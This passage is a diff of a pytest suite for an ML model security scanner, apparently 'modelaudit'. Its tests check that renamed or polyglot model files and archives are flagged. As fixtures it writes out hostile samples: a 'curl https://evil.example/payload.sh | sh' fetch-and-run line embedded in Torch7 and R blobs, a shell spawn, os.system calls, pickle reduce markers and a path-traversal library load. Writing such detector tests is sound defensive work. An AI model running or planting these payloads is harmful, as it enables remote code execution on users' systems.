-def test_scan_zip_ignores_nonexecuting_subprocess_api(tmp_path: Path, source: str) -> None:
-    archive_path = tmp_path / "source_bundle.zip"
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("preprocess.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    assert result.success is True
-    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-
-
-@pytest.mark.parametrize("dispatch", ["handlers['system'](1.0)", "handlers.get('system')(1.0)"])
-def test_scan_zip_ignores_benign_dictionary_dispatch_python_member(tmp_path: Path, dispatch: str) -> None:
-    archive_path = tmp_path / "source_bundle.zip"
-    source = (
-        "def normalize(value: float) -> float:\n"
-        "    return value / 255.0\n"
-        "handlers = {'system': normalize}\n"
-        f"{dispatch}\n"
-    )
-    with zipfile.ZipFile(archive_path, "w") as archive:
-        archive.writestr("preprocess.py", source)
-
-    result = ZipScanner().scan(str(archive_path))
-
-    assert result.success is True
-    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-
-
 def test_scan_zip_marks_malformed_python_member_incomplete(tmp_path: Path) -> None:
     archive_path = tmp_path / "source_bundle.zip"
     with zipfile.ZipFile(archive_path, "w") as archive:
@@ -1224,7 +1199,7 @@ def test_scan_npz_flags_executable_member(tmp_path: Path) -> None:
     archive_path = tmp_path / "model_bundle.npz"
     with zipfile.ZipFile(archive_path, "w") as archive:
         archive.writestr("arrays.npy", _npy_payload())
-        archive.writestr("bin/pickle_payload.sh", "#!/bin/sh\necho hidden\n")
+        archive.writestr("bin/run.sh", "#!/bin/sh\necho hidden\n")
 
     result = ZipScanner().scan(str(archive_path))
 
@@ -1235,9 +1210,7 @@ def test_scan_npz_flags_executable_member(tmp_path: Path) -> None:
     ]
     assert len(executable_checks) == 1
     assert executable_checks[0].severity == IssueSeverity.WARNING
-    assert executable_checks[0].details["entry"] == "bin/pickle_payload.sh"
-    assert executable_checks[0].rule_code == "S504"
-    assert not [check for check in result.checks if check.rule_code == "S213"]
+    assert executable_checks[0].details["entry"] == "bin/run.sh"
 
 
 def test_scan_npz_flags_extensionless_executable_member(tmp_path: Path) -> None:
@@ -1245,7 +1218,7 @@ def test_scan_npz_flags_extensionless_executable_member(tmp_path: Path) -> None:
     archive_path = tmp_path / "model_bundle.npz"
     with zipfile.ZipFile(archive_path, "w") as archive:
         archive.writestr("arrays.npy", _npy_payload())
-        archive.writestr("bin/pickle_payload", b"\x7fELF" + b"\x00" * 64)
+        archive.writestr("bin/runme", b"\x7fELF" + b"\x00" * 64)
 
     result = ZipScanner().scan(str(archive_path))
 
@@ -1256,9 +1229,7 @@ def test_scan_npz_flags_extensionless_executable_member(tmp_path: Path) -> None:
     ]
     assert len(executable_checks) == 1
     assert executable_checks[0].severity == IssueSeverity.WARNING
-    assert executable_checks[0].details["entry"] == "bin/pickle_payload"
-    assert executable_checks[0].rule_code == "S502"
-    assert not [check for check in result.checks if check.rule_code == "S213"]
+    assert executable_checks[0].details["entry"] == "bin/runme"
 
 
 def test_scan_npz_ignores_extensionless_executable_near_match(tmp_path: Path) -> None:
@@ -1305,6 +1276,27 @@ def test_scan_npz_flags_extensionless_pe_member_with_late_header(tmp_path: Path)
     ]
     assert len(executable_checks) == 1
     assert executable_checks[0].details["entry"] == "bin/runme"
+
+
+def test_scan_npz_marks_unconfirmed_pe_pointer_inconclusive(tmp_path: Path) -> None:
+    """A bounded PE probe cannot report an executable without confirmation bytes."""
+    archive_path = tmp_path / "model_bundle.npz"
+    payload = bytearray(64)
+    payload[:2] = b"MZ"
+    payload[0x3C:0x40] = ((1024 * 1024) + 1).to_bytes(4, "little")
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("arrays.npy", _npy_payload())
+        archive.writestr("bin/runme", payload)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "zip_executable_member_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert not any(
+        check.name == "Executable Archive Member Detection" and check.severity == IssueSeverity.WARNING
+        for check in result.checks
+    )
 
 
 @pytest.mark.parametrize(
@@ -1369,11 +1361,8 @@ def test_scan_zip_ignores_benign_python_file_operations(tmp_path: Path) -> None:
         ("import os\nos.system('echo hidden')\n", "S101", "os.system"),
         ("import os\nos.popen('echo hidden')\n", "S101", "os.popen"),
         ("import subprocess\nsubprocess.run(['echo'], check=False)\n", "S103", "subprocess.run"),
-        ("import subprocess\nsubprocess.getoutput('echo hidden')\n", "S103", "subprocess.getoutput"),
-        ("import subprocess\nsubprocess.getstatusoutput('echo hidden')\n", "S103", "subprocess.getstatusoutput"),
-        ("import pty\npty.spawn('/bin/sh')\n", "S111", "pty.spawn"),
-        ("import runpy\nrunpy.run_path('payload.py')\n", "S108", "runpy.run_path"),
         ("import importlib\nimportlib.import_module('os')\n", "S107", "importlib.import_module"),
+        ("import runpy\nrunpy.run_path('payload.py')\n", "S108", "runpy.run_path"),
         ("eval('1 + 1')\n", "S104", "eval"),
         ("import pickle\npickle.loads(b'\\x80\\x04N.')\n", "S213", "pickle.loads"),
         ("__import__('os').system('echo hidden')\n", "S106", "__import__"),
@@ -1420,7 +1409,7 @@ def test_scan_zip_python_member_emits_separate_check_per_rule_code(tmp_path: Pat
 
 
 def test_scan_zip_honors_max_mar_python_analysis_bytes_config(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
-    """Generic ZIP Python analysis reasons survive nested inconclusive routing."""
+    """Generic ZIP Python analysis stays focused on Python-source coverage."""
     monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
     archive_path = tmp_path / "source_bundle.zip"
     # ~60 KB payload; a 1 KB configured cap must cause the scanner to mark this
@@ -1443,7 +1432,7 @@ def test_scan_zip_honors_max_mar_python_analysis_bytes_config(tmp_path: Path, mo
     assert details["file_size"] >= 60_000
     reasons = result.metadata["scan_outcome_reasons"]
     assert "zip_python_member_analysis_incomplete" in reasons
-    assert "onnx_tentative_candidate_analysis_unavailable" in reasons
+    assert "onnx_tentative_candidate_analysis_unavailable" not in reasons
 
 
 def test_scan_zip_python_member_honors_pep263_encoding_declaration(tmp_path: Path) -> None:
@@ -1659,110 +1648,1567 @@ def test_scan_nested_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp
     assert "bounded probe ended before the first structural root element" in check.message
 
 
-def test_scan_nested_file_recovers_findings_from_budget_exhausted_onnx_candidate(tmp_path: Path) -> None:
-    pytest.importorskip("onnx")
-    extracted_member = create_mock_onnx(tmp_path / "payload.jpg", op_type="PythonOp")
-    prefix_mock_onnx_with_unknown_field(extracted_member, value_size=0, count=4097, field_number=8)
-
-    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
-
-    assert result.scanner_name == "onnx"
-    assert result.success is False
-    assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
-
-
-def test_scan_nested_file_rejects_ambiguous_protobuf_without_findings(tmp_path: Path) -> None:
-    pytest.importorskip("onnx")
-    extracted_member = tmp_path / "ambiguous.jpg"
-    extracted_member.write_bytes(b"\x12" + (b"x" * (20 * 1024 * 1024)))
-
-    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
-
-    assert result.scanner_name == "unknown"
-    assert result.success is True
-    assert result.issues == []
-    assert result.metadata.get("tentative_protobuf_candidate_rejected") is True
-
-
-def test_scan_nested_file_preserves_ambiguous_protobuf_without_onnx(
+def test_scan_nested_file_fails_closed_when_tensorflow_protobuf_routing_budget_is_exhausted(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    extracted_member = tmp_path / "ambiguous.jpg"
-    extracted_member.write_bytes(b"\x12" + (b"x" * (20 * 1024 * 1024)))
-    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
+    extracted_member = tmp_path / "ambiguous-routing.jpg"
+    extracted_member.write_bytes(b"\x08\x01" + (b"\x18\x00" * 4))
 
     result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
 
     assert result.scanner_name == "unknown"
     assert result.success is False
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-    assert "onnx_tentative_candidate_analysis_unavailable" in result.metadata["scan_outcome_reasons"]
-    assert result.metadata["tentative_protobuf_candidate_unanalyzed"] == "onnx_dependency_unavailable"
+    assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
+    check = next(check for check in result.checks if check.name == "TensorFlow Protobuf Routing")
+    assert "bounded structural probe reached its limit" in check.message
+
+
+def test_scan_nested_file_fails_closed_when_unknown_prefix_hides_tensorflow_after_budget(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
+    extracted_member = tmp_path / "budget-prefixed.jpg"
+    extracted_member.write_bytes(
+        b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_metagraph()
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
+
+
+def test_scan_nested_file_fails_closed_for_ambiguous_savedmodel_flax_overlap(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
+    extracted_member = tmp_path / "saved-flax-overlap.jpg"
+    extracted_member.write_bytes(
+        b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_savedmodel()
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
+
+
+@pytest.mark.parametrize(
+    ("filename", "payload", "expected_scanner"),
+    [
+        ("prefixed-graph.jpg", _build_malicious_tf_metagraph, "tf_metagraph"),
+        ("prefixed-saved.jpg", _build_malicious_tf_savedmodel, "tf_savedmodel"),
+    ],
+)
+def test_scan_nested_file_routes_tensorflow_after_printable_unknown_prefix(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+    payload: Callable[[], bytes],
+    expected_scanner: str,
+) -> None:
+    monkeypatch.setattr(file_detection, "JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES", 64)
+    extracted_member = tmp_path / filename
+    printable_field = b"z " + (b"x" * 32)
+    extracted_member.write_bytes((printable_field * 3) + payload())
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == expected_scanner
+    assert result.success is False
+    assert any("PyFunc" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_routes_renamed_flax_msgpack_by_structure(tmp_path: Path) -> None:
+    msgpack = pytest.importorskip("msgpack")
+    extracted_member = tmp_path / "payload.jpg"
+    extracted_member.write_bytes(
+        msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+def test_scan_nested_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.bin"
+    extracted_member.write_bytes(
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["torch7"]
     assert any(
-        issue.severity == IssueSeverity.INFO and "dependency is unavailable" in issue.message for issue in result.issues
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
     )
 
 
-def test_scan_nested_file_keeps_claimed_onnx_candidate_fail_closed(tmp_path: Path) -> None:
-    pytest.importorskip("onnx")
-    extracted_member = tmp_path / "ambiguous.onnx"
-    extracted_member.write_bytes(b"\x4a\x00" * 4097)
+def test_scan_nested_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.bin"
+    extracted_member.write_bytes(
+        b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
+        b"base::system('curl https://evil.example/payload.sh | sh')\n"
+        b"\x7fELF" + b"\x00" * 128
+    )
 
     result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
 
-    assert result.scanner_name == "onnx"
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["r_serialized"]
+    assert any("Linux executable" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Executable Symbol Context Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Serialized Expression Payload Detection"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_routes_torch7_bin_when_raw_scanner_is_suppressed(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.bin"
+    extracted_member.write_bytes(
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["torch7"], "cache_enabled": False})
+
+    assert result.scanner_name == "torch7"
+    assert "pytorch_binary" in result.metadata["skipped_scanner_ids"]
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_routes_renamed_mxnet_symbol_by_structure(tmp_path: Path) -> None:
+    extracted_member = create_mock_mxnet_symbol(tmp_path / "payload.dat", custom_library="../../tmp/libevil.so")
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+
+
+def test_scan_nested_file_fails_closed_for_renamed_mxnet_shadowed_nodes(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.dat"
+    extracted_member.write_text(
+        '{"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[{"op":"null","name":"data"}]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
     assert result.success is False
-    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-    check = next(check for check in result.checks if check.name == "ONNX Structure Validation")
-    assert "missing required model structure" in check.message
+    assert "mxnet_symbol_duplicate_root_keys" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "MXNet Symbol JSON Analysis" and check.details.get("duplicate_root_keys") == ["nodes"]
+        for check in result.checks
+    )
 
 
-def test_scan_nested_file_fails_closed_when_protobuf_candidate_analyzer_is_unavailable(
+def test_scan_nested_file_canonical_mxnet_symbol_bypasses_routing_value_budget(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "large-symbol.json"
+    extracted_member.write_text(
+        '{"padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+
+
+@pytest.mark.parametrize("filename", ["payload.params", "payload.meta"])
+def test_scan_nested_file_runs_xgboost_checks_for_renamed_mxnet_json_overlap(tmp_path: Path, filename: str) -> None:
+    extracted_member = tmp_path / filename
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_runs_xgboost_checks_for_probable_malformed_mxnet_json_overlap(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "malformed-polyglot.json"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+@pytest.mark.parametrize("filename", ["malformed-0000.params", "malformed.jpg"])
+def test_scan_nested_file_runs_xgboost_checks_for_renamed_probable_malformed_mxnet_overlap(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    extracted_member = tmp_path / filename
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"__reduce__"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert any(
+        "Suspicious pattern detected: Pickle-like reduction pattern in JSON" in issue.message for issue in result.issues
+    )
+
+
+def test_scan_nested_file_syntactically_malformed_renamed_mxnet_xgboost_overlap_fails_closed(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "malformed.jpg"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],@}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
+
+
+@pytest.mark.parametrize("suffix", ["@}", ""])
+def test_scan_nested_file_partial_malformed_renamed_mxnet_xgboost_overlap_fails_closed(
+    tmp_path: Path,
+    suffix: str,
+) -> None:
+    extracted_member = tmp_path / "malformed.jpg"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":' + suffix,
+        encoding="utf-8",
+    )
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+
+
+def test_scan_nested_file_xgboost_only_runs_renamed_probable_malformed_mxnet_overlap(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "malformed-0000.params"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_xgboost_only_malformed_overlap_fails_closed(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "malformed-0000.params"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{}},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "xgboost_json_structure_invalid" in result.metadata["scan_outcome_reasons"]
+    assert "mxnet" in result.metadata["skipped_scanner_ids"]
+
+
+def test_scan_nested_file_runs_xgboost_checks_for_bounded_probable_malformed_mxnet_overlap(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    extracted_member = tmp_path / "candidate.jpg"
-    extracted_member.write_bytes(b"bounded-probe candidate")
-
-    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT)
-    monkeypatch.setattr(
-        archive_dispatch,
-        "detect_file_format_from_magic",
-        lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT,
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "bounded-polyglot.json"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"padding":"' + ("x" * 256) + '","nodes":[{"op":"null","name":"data"}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
     )
-    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
-    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_keeps_benign_mxnet_json_near_match_out_of_xgboost_routing(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "benign-symbol.json"
+    extracted_member.write_text(
+        '{"learner":{"description":"benign metadata"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert not any(check.name == "JSON Content Analysis" for check in result.checks)
+
+
+@pytest.mark.parametrize("filename", ["nested-metadata.json", "nested-metadata-symbol.json"])
+def test_scan_nested_file_keeps_nested_xgboost_marker_names_in_mxnet_metadata_out_of_xgboost_analysis(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    extracted_member = tmp_path / filename
+    extracted_member.write_text(
+        '{"nodes":[{"op":"null","name":"data","attrs":{"documentation":'
+        '{"version":"malformed","learner":{"gradient_booster":{},"note":"eval(x)"}}}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert not any(check.name == "JSON Content Analysis" for check in result.checks)
+
+
+def test_scan_nested_file_canonical_mxnet_symbol_composes_probable_xgboost_security_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "malformed-symbol.json"
+    extracted_member.write_text(
+        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert result.success is False
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_bom_prefixed_params_runs_xgboost_mxnet_overlap_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_text(
+        '\ufeff{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+
+
+def test_scan_nested_file_xgboost_owned_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_bytes(
+        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        b'"metadata":"\x7fELF"}'
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_xgboost_owned_shadowed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_bytes(
+        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        b'"metadata":"\x7fELF","nodes":[]}'
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_xgboost_owned_analysis_failed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_bytes(
+        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
+    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_xgboost_only_skips_overlap_params_signature_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_bytes(
+        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        b'"metadata":"\x7fELF"}'
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is True
+    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    assert "mxnet" in result.metadata["skipped_scanner_ids"]
+
+
+def test_scan_nested_file_xgboost_only_skips_shadowed_params_signature_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_bytes(
+        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        b'"metadata":"\x7fELF","nodes":[]}'
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    assert "mxnet" in result.metadata["skipped_scanner_ids"]
+
+
+def test_scan_nested_file_xgboost_only_skips_analysis_failed_params_signature_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot-0000.params"
+    extracted_member.write_bytes(
+        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
+    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    assert "mxnet" in result.metadata["skipped_scanner_ids"]
+
+
+def test_scan_nested_file_fails_closed_for_xgboost_shadowed_mxnet_nodes(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
